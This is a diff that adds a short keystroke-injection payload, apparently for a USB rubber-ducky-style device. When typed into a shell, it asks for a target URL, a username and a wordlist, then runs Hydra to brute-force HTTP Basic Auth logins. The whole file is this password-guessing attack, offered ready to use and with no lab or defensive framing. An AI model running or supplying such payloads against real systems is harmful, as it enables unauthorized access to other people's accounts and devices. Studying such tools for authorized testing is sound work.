@@ -1,0 +1,4 @@
+REM Brute-force HTTP Basic Auth login with Hydra
+DELAY 500
+STRING read -p "Target URL (e.g. http://192.168.1.1/login): " url; read -p "Username: " u; read -p "Wordlist path: " w; hydra -l "$u" -P "$w" -s 80 "$url" http-get /
+ENTER
